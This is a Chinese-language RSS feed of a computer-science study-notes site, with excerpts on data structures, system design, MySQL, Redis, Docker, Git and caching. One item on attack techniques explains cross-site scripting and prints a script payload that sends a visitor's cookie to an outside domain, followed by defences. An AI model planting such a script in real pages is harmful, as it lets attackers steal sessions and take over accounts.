<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>简介 on KeepLearning</title>
    <link>https://example.com/keeplearning/</link>
    <description>Recent content in 简介 on KeepLearning</description>
    <generator>Hugo -- gohugo.io</generator><atom:link href="https://example.com/keeplearning/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>计算机基础书籍推荐</title>
      <link>https://example.com/keeplearning/docs/favorite/cs-learn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/favorite/cs-learn/</guid>
      <description>计算机基础书籍推荐 # 在自学过程中，最容易踩坑的地方就是不看自己当前水平，盲目跟风买那些豆瓣高分的大而全的计算机黑皮系列的书，然后学几天，就放弃了。
这些大而全的计算机黑皮书当然很经典，但是它们并不适合新人入门学习，因为这类书籍的内容都充满大量的专业术语，我们在看到陌生又难以理解的词汇时，就会感觉很吃力，脑子看着就会很累，就会驱使你做简单和快乐的事情，比如睡觉、刷短视频、玩游戏。
所以，学习一门学科的时候，要从最基础的书开始学起，接着搭配视频快速入门，然后再渐渐步入到这些大而全的计算机黑皮书。
关键的问题来了，计算机基础有哪些入门的基础书和视频呢？
一、数据结构与算法 # 数据结构与算法是非常非常非常重要的，想要冲大厂如果这方面不过关可能连笔试都过不去，更别谈面试的手撕算法了。
算法： 动态规划、回溯算法、查找算法、搜索算法、贪心算法、分治算法、位运算、双指针、排序、模拟、数学、…… 数据结构： 数组、栈、队列、字符串、链表、树、图、堆、哈希表、…… 数据结构学习 # 首先推荐 《大话数据结构》 这本入门级别的书，因为书里的内容都是大白话，而且还图文并茂，读起来还是很顺畅的。
然后视频推荐 《浙江大学的数据结构》 课程，在 B 站就能搜索到，课程是老师带大家用 C 语言来实现各种常见的数据结构。
现在大多数高级语言都会有容器，就是把一些常见的数据结构封装成了容器，使用起来比较方便，但是不利于理解底层的数据结构是怎么变换和操作的，所以这门课还是很有意义的。
如果想要实战的话，可以去 LeetCode 官方出品的免费教程 Leetbook，网站很细心的按照各个知识点循序渐进地罗列了出来。讲解知识 + 实战演练，学习起来会比看书效率高。
算法学习 # 算法刷题可从以下三个渠道。
第一个， 剑指offer
第二个， 力扣
第三个，近期 面试中常考题
《剑指 offer》作为大经典，是一定要刷两遍以上的，很多题都是面试时的原题，里面包含了很多笔试常用的思想方法，反复看，反复研。
leetcode 由于题目十分之多，刷完是不太可能的。可以把 leetcode 作为弱项的专项练习。leetcode 右侧有标签分类，如下图：
另外在巩固完弱项的情况下，建议将 leetcode 前 300 题刷熟练，国内大厂面试出的代码题 80% 都是这个范围内的。
另外，labuladong 总结的 算法小抄 对算法的理解很有帮助。
公司常考题有：
链表类（链表反转类题目） 二叉树类（二叉树的遍历类型题，最大公祖先类题目） 字符串操作题目 dfs/bfs 动态规划（这个考的基本都是 leetcode 上的或者是背包问题，对于动态规划问题其实有很多种类，比较见到的就是一维动态和二维动态），另外还有区间调度类型的题目（贪心算法，也属于动态规划的一种特殊情况）。 其实也没有什么技巧，多刷题，多理解就好了。
二、计算机组成原理 # 计算组成原理确实是分为两个方向，一个是硬件电路的，一个是软件程序的。</description>
    </item>
    
    <item>
      <title>系统设计基础</title>
      <link>https://example.com/keeplearning/docs/system-design/overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/overview/</guid>
      <description>系统设计基础 # 一、性能 # 性能指标 # 1. 响应时间 # 指某个请求从发出到接收到响应消耗的时间。
在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。
2. 吞吐量 # 指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。
3. 并发用户数 # 指系统能同时处理的并发用户请求数量。
在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。
目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：
多 CPU IO 等待时间 使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。
并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。
性能优化 # 1. 集群 # 将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。
2. 缓存 # 缓存能够提高性能的原因如下：
缓存数据通常位于内存等介质中，这种介质对于读操作特别快； 缓存数据可以位于靠近用户的地理位置上； 可以将计算结果进行缓存，从而避免重复计算。 3. 异步 # 某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。
二、伸缩性 # 指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。
伸缩性与性能 # 如果系统存在性能问题，那么单个用户的请求总是很慢的；
如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。
实现伸缩性 # 应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。
关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。
对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。
三、扩展性 # 指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。</description>
    </item>
    
    <item>
      <title>正则表达式</title>
      <link>https://example.com/keeplearning/docs/coding-practice/regex/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/coding-practice/regex/</guid>
      <description>正则表达式 # 一、概述 # 正则表达式用于文本内容的查找和替换。
正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。
正则表达式在线工具
二、匹配单个字符 # . 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；
. 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。
正则表达式一般是区分大小写的，但也有些实现不区分。
正则表达式
C.C2018 匹配结果
My name is CyC2018 .
三、匹配一组字符 # [ ] 定义一个字符集合；
0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。
- 只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；
^ 在 [ ] 中是取非操作。
应用
匹配以 abc 为开头，并且最后一个字母不为数字的字符串：
正则表达式
abc[^0-9] 匹配结果
abcd abc1 abc2 四、使用元字符 # 匹配空白字符 # 元字符 说明 [\b] 回退（删除）一个字符 \f 换页符 \n 换行符 \r 回车符 \t 制表符 \v 垂直制表符 \r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n。</description>
    </item>
    
    <item>
      <title>总览</title>
      <link>https://example.com/keeplearning/docs/mysql/overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/mysql/overview/</guid>
      <description>总览 # 一、索引 # B+ Tree 原理 # 1. 数据结构 # B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。
B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。
在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。
2. 操作 # 进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。
插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。
3. 与红黑树的比较 # 红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。
（一）B+ 树有更低的树高
平衡树的树高 O(h)=O(logdN)，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。</description>
    </item>
    
    <item>
      <title>总览</title>
      <link>https://example.com/keeplearning/docs/redis/overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/redis/overview/</guid>
      <description>总览 # 一、概述 # Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。
键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。
Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。
二、数据类型 # 数据类型 可以存储的值 操作 STRING 字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作 LIST 列表 从两端压入或者弹出元素 对单个或者多个元素进行修剪， 只保留一个范围内的元素 SET 无序集合 添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素 HASH 包含键值对的无序散列表 添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在 ZSET 有序集合 添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名 What Redis data structures look like
STRING # &amp;gt; set hello world OK &amp;gt; get hello &amp;#34;world&amp;#34; &amp;gt; del hello (integer) 1 &amp;gt; get hello (nil) LIST # &amp;gt; rpush list-key item (integer) 1 &amp;gt; rpush list-key item2 (integer) 2 &amp;gt; rpush list-key item (integer) 3 &amp;gt; lrange list-key 0 -1 1) &amp;#34;item&amp;#34; 2) &amp;#34;item2&amp;#34; 3) &amp;#34;item&amp;#34; &amp;gt; lindex list-key 1 &amp;#34;item2&amp;#34; &amp;gt; lpop list-key &amp;#34;item&amp;#34; &amp;gt; lrange list-key 0 -1 1) &amp;#34;item2&amp;#34; 2) &amp;#34;item&amp;#34; SET # &amp;gt; sadd set-key item (integer) 1 &amp;gt; sadd set-key item2 (integer) 1 &amp;gt; sadd set-key item3 (integer) 1 &amp;gt; sadd set-key item (integer) 0 &amp;gt; smembers set-key 1) &amp;#34;item&amp;#34; 2) &amp;#34;item2&amp;#34; 3) &amp;#34;item3&amp;#34; &amp;gt; sismember set-key item4 (integer) 0 &amp;gt; sismember set-key item (integer) 1 &amp;gt; srem set-key item2 (integer) 1 &amp;gt; srem set-key item2 (integer) 0 &amp;gt; smembers set-key 1) &amp;#34;item&amp;#34; 2) &amp;#34;item3&amp;#34; HASH # &amp;gt; hset hash-key sub-key1 value1 (integer) 1 &amp;gt; hset hash-key sub-key2 value2 (integer) 1 &amp;gt; hset hash-key sub-key1 value1 (integer) 0 &amp;gt; hgetall hash-key 1) &amp;#34;sub-key1&amp;#34; 2) &amp;#34;value1&amp;#34; 3) &amp;#34;sub-key2&amp;#34; 4) &amp;#34;value2&amp;#34; &amp;gt; hdel hash-key sub-key2 (integer) 1 &amp;gt; hdel hash-key sub-key2 (integer) 0 &amp;gt; hget hash-key sub-key1 &amp;#34;value1&amp;#34; &amp;gt; hgetall hash-key 1) &amp;#34;sub-key1&amp;#34; 2) &amp;#34;value1&amp;#34; ZSET # &amp;gt; zadd zset-key 728 member1 (integer) 1 &amp;gt; zadd zset-key 982 member0 (integer) 1 &amp;gt; zadd zset-key 982 member0 (integer) 0 &amp;gt; zrange zset-key 0 -1 withscores 1) &amp;#34;member1&amp;#34; 2) &amp;#34;728&amp;#34; 3) &amp;#34;member0&amp;#34; 4) &amp;#34;982&amp;#34; &amp;gt; zrangebyscore zset-key 0 800 withscores 1) &amp;#34;member1&amp;#34; 2) &amp;#34;728&amp;#34; &amp;gt; zrem zset-key member1 (integer) 1 &amp;gt; zrem zset-key member1 (integer) 0 &amp;gt; zrange zset-key 0 -1 withscores 1) &amp;#34;member0&amp;#34; 2) &amp;#34;982&amp;#34; 三、数据结构 # 字典 # dictht 是一个散列表结构，使用拉链法解决哈希冲突。</description>
    </item>
    
    <item>
      <title>Docker</title>
      <link>https://example.com/keeplearning/docs/coding-practice/docker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/coding-practice/docker/</guid>
      <description> Docker # 一、解决的问题 # 由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。
Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。
二、与虚拟机的比较 # 虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。
启动速度 # 启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢；
而启动 Docker 相当于启动宿主操作系统上的一个进程。
占用资源 # 虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。
而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。
三、优势 # 除了启动速度快以及占用资源少之外，Docker 具有以下优势：
更容易迁移 # 提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。
更容易维护 # 使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。
更容易扩展 # 可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。
四、使用场景 # 持续集成 # 持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。
Docker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。
提供可伸缩的云服务 # 根据应用的负载情况，可以很容易地增加或者减少 Docker。
搭建微服务架构 # Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。
五、镜像与容器 # 镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。
镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。
构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。
参考资料 # DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP Docker 入门教程 Docker container vs Virtual machine How to Create Docker Container using Dockerfile 理解 Docker（2）：Docker 镜像 为什么要使用 Docker？ What is Docker 持续集成是什么？ </description>
    </item>
    
    <item>
      <title>SQL 语法</title>
      <link>https://example.com/keeplearning/docs/mysql/sql-grammar/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/mysql/sql-grammar/</guid>
      <description>SQL 语法 # 一、基础 # 模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。
主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。
SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。
SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。
SQL 支持以下三种注释：
--- 注释 SELECT * FROM mytable; -- 注释 /* 注释1 注释2 */ 数据库创建与使用：
CREATE DATABASE test; USE test; 二、创建表 # CREATE TABLE mytable ( --- int 类型，不为空，自增 id INT NOT NULL AUTO_INCREMENT, --- int 类型，不可为空，默认值为 1，不为空 col1 INT NOT NULL DEFAULT 1, --- 变长字符串类型，最长为 45 个字符，可以为空 col2 VARCHAR(45) NULL, --- 日期类型，可为空 col3 DATE NULL, --- 设置主键为 id PRIMARY KEY (`id`)); 三、修改表 # 添加列</description>
    </item>
    
    <item>
      <title>STRING</title>
      <link>https://example.com/keeplearning/docs/redis/string/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/redis/string/</guid>
      <description> STRING # </description>
    </item>
    
    <item>
      <title>分布式</title>
      <link>https://example.com/keeplearning/docs/system-design/distributed/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/distributed/</guid>
      <description>分布式 # 一、分布式锁 # 在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。
阻塞锁通常使用互斥量来实现：
互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。 1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。
数据库的唯一索引 # 获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。
存在以下几个问题：
锁没有失效时间，解锁失败的话其它进程无法再获得该锁； 只能是非阻塞锁，插入失败直接就报错了，无法重试； 不可重入，已经获得锁的进程也必须重新获取锁。 Redis 的 SETNX 指令 # 使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。
SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。
EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。
Redis 的 RedLock 算法 # 使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。
尝试从 N 个互相独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，才认为获取锁成功； 如果获取锁失败，就到每个实例上释放锁。 Zookeeper 的有序节点 # 1. Zookeeper 抽象模型 # Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。</description>
    </item>
    
    <item>
      <title>Git</title>
      <link>https://example.com/keeplearning/docs/coding-practice/git/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/coding-practice/git/</guid>
      <description>Git # 集中式与分布式 # Git 属于分布式版本控制系统，而 SVN 属于集中式。
集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。
集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。
集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。
分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。
中心服务器 # 中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。
Github 就是一个中心服务器。
工作流 # 新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。
Git 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 存储所有分支信息，使用一个 HEAD 指针指向当前分支。
git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset &amp;ndash; files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files git checkout &amp;ndash; files 使用暂存区的修改覆盖工作目录，用来撤销本地修改 可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。
git commit -a 直接把所有文件的修改添加到暂存区然后执行提交 git checkout HEAD &amp;ndash; files 取出最后一次修改，可以用来进行回滚操作 分支实现 # 使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。</description>
    </item>
    
    <item>
      <title>集群</title>
      <link>https://example.com/keeplearning/docs/system-design/cluster/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/cluster/</guid>
      <description>集群 # 一、负载均衡 # 集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。
负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。
负载均衡器可以用来实现高可用以及伸缩性：
高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用； 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。 负载均衡器运行过程包含两个部分：
根据负载均衡算法得到转发的节点； 进行转发。 负载均衡算法 # 1. 轮询（Round Robin） # 轮询算法把每个请求轮流发送到每个服务器上。
下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。
该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。
2. 加权轮询（Weighted Round Robbin） # 加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。
例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。
3. 最少连接（least Connections） # 由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。</description>
    </item>
    
    <item>
      <title>数据库系统原理</title>
      <link>https://example.com/keeplearning/docs/mysql/dbs-theory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/mysql/dbs-theory/</guid>
      <description>数据库系统原理 # 一、事务 # 概念 # 事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。
ACID # 1. 原子性（Atomicity） # 事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。
回滚可以用回滚日志（Undo Log）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。
2. 一致性（Consistency） # 数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。
3. 隔离性（Isolation） # 一个事务所做的修改在最终提交以前，对其它事务是不可见的。
4. 持久性（Durability） # 一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。
系统发生崩溃可以用重做日志（Redo Log）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。
事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：
只有满足一致性，事务的执行结果才是正确的。 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。 在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。 事务满足持久化是为了能应对系统崩溃的情况。 AUTOCOMMIT # MySQL 默认采用自动提交模式。也就是说，如果不显式使用START TRANSACTION语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。
二、并发一致性问题 # 在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。
丢失修改 # 丢失修改指一个事务的更新操作被另外一个事务的更新操作替换。一般在现实生活中常会遇到，例如：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改并提交生效，T2 随后修改，T2 的修改覆盖了 T1 的修改。
读脏数据 # 读脏数据指在不同的事务下，当前事务可以读到另外事务未提交的数据。例如：T1 修改一个数据但未提交，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。</description>
    </item>
    
    <item>
      <title>常见问题（一）</title>
      <link>https://example.com/keeplearning/docs/mysql/faq1.md/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/mysql/faq1.md/</guid>
      <description>MySQL 常见问题（一） # 1. 出现 Unknown column 错误是在哪个阶段 # MySQL 会在分析器中判断语句是否正确，表是否存在，列是否存在等，如果没有问题再提交给优化器。
2. 为什么对权限的检查不在优化器之前做 # 有些时候，SQL 语句要操作的表不只是 SQL 字面上那些。比如有个触发器，得在执行器阶段（过程中）才能确定，优化器阶段前是无能为力的。
客户端连接时，如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限，之后，这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。一个用户成功建立连接后，即使用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。修改完成后，只有再新建的连接才会使用新的权限设置。
3. 一个查询语句的执行流程是什么 # 一条查询语句的执行过程一般是经过连接器、分析器、优化器、执行器等功能模块，最后到达存储引擎。
4. bin log、redo log、undo log 的区别 # redo log 是 InnoDB 引擎特有的；binlog 是 MySQL 的 Server 层实现的，所有引擎都可以使用。
redo log 是物理日志，记录的是「在某个数据页上做了什么修改」；binlog 是逻辑日志，记录的是这个语句的原始逻辑，比如「给 ID=2 这一行的 c 字段加 1」。
redo log 是循环写的，空间固定会用完；binlog 是可以追加写入的。“追加写”是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。
InnoDB 的 redo log 是固定大小的，比如可以配置为一组 4 个文件，每个文件的大小是 1GB，那么总共就可以记录 4GB 的操作。从头开始写，写到末尾就又回到开头循环写，如下图所示
write pos 是当前记录的位置，一边写一边后移，写到第 3 号文件末尾后就回到 0 号文件开头。checkpoint 是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。擦除后“空着的部分”就是 write pos 到 3 号文件末尾，再加上 0 号文件开头到 checkpoint 的部分。</description>
    </item>
    
    <item>
      <title>代码可读性</title>
      <link>https://example.com/keeplearning/docs/coding-practice/code-readability/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/coding-practice/code-readability/</guid>
      <description>一、可读性的重要性 # 编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。
可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。
只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。
二、用名字表达代码含义 # 一些比较有表达力的单词：
单词 可替代单词 send deliver、dispatch、announce、distribute、route find search、extract、locate、recover start launch、create、begin、open make create、set up、build、generate、compose、add、new 使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。
为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。
三、名字不能带来歧义 # 起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。
布尔相关的命名加上 is、can、should、has 等前缀。
用 min、max 表示数量范围；
用 first、last 表示访问空间的包含范围；
begin、end 表示访问空间的排除范围，即 end 不包含尾部。
四、良好的代码风格 # 适当的空行和缩进。
排列整齐的注释：
int a = 1; // 注释 int b = 11; // 注释 int c = 111; // 注释 语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。
五、为何编写注释 # 阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。</description>
    </item>
    
    <item>
      <title>攻击技术</title>
      <link>https://example.com/keeplearning/docs/system-design/attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/attack/</guid>
      <description>攻击技术 # 一、跨站脚本攻击 # 概念 # 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
攻击原理 # 例如有一个论坛网站，攻击者可以在上面发布以下内容：
&amp;lt;script&amp;gt;location.href = &amp;#34;//domain.com/?c=&amp;#34; + document.cookie&amp;lt;/script&amp;gt; 之后该内容可能会被渲染成以下形式：
&amp;lt;p&amp;gt; &amp;lt;script&amp;gt;location.href = &amp;#34;//domain.com/?c=&amp;#34; + document.cookie&amp;lt;/script&amp;gt; &amp;lt;/p&amp;gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
危害 # 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段 # 1. 设置 Cookie 为 HttpOnly # 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
2. 过滤特殊字符 # 例如将 &amp;lt; 转义为 &amp;amp;lt;，将 &amp;gt; 转义为 &amp;amp;gt;，从而避免 HTML 和 Jascript 代码的运行。</description>
    </item>
    
    <item>
      <title>缓存</title>
      <link>https://example.com/keeplearning/docs/system-design/cache/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/cache/</guid>
      <description>缓存 # 一、缓存特征 # 命中率 # 当某个请求能够通过访问缓存而得到响应时，称为缓存命中。
缓存命中率越高，缓存的利用率也就越高。
